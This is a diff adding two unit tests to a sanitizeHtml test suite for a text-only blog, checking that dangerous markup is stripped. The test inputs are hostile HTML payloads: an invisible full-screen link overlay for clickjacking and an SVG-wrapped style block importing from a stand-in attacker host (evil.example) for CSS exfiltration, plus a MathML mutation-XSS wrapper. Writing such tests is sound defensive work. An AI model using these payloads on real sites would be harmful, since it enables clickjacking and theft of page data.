@@ -41,4 +41,24 @@ describe("sanitizeHtml (text-only blog)", () => {
     expect(out).toContain("<strong>Bold</strong>");
     expect(out).toContain("<em>italic</em>");
   });
+
+  it("strips the inline style attribute (clickjacking-overlay vector)", () => {
+    const out = sanitizeHtml(
+      '<a href="https://x.example" style="position:fixed;inset:0;width:100vw;height:100vh;opacity:0">.</a>',
+    );
+    expect(out).not.toContain("style=");
+    expect(out).not.toContain("position:fixed");
+    expect(out).toContain("href=");
+  });
+
+  it("strips <style>/<svg>/<math> (CSS-exfil / mXSS-wrapper vectors)", () => {
+    const out = sanitizeHtml(
+      '<p>ok</p><svg><style>@import url(https://evil.example/x)</style></svg><math><mtext>m</mtext></math>',
+    );
+    expect(out).not.toContain("<style");
+    expect(out).not.toContain("<svg");
+    expect(out).not.toContain("<math");
+    expect(out).not.toContain("@import");
+    expect(out).toContain("ok");
+  });
 });
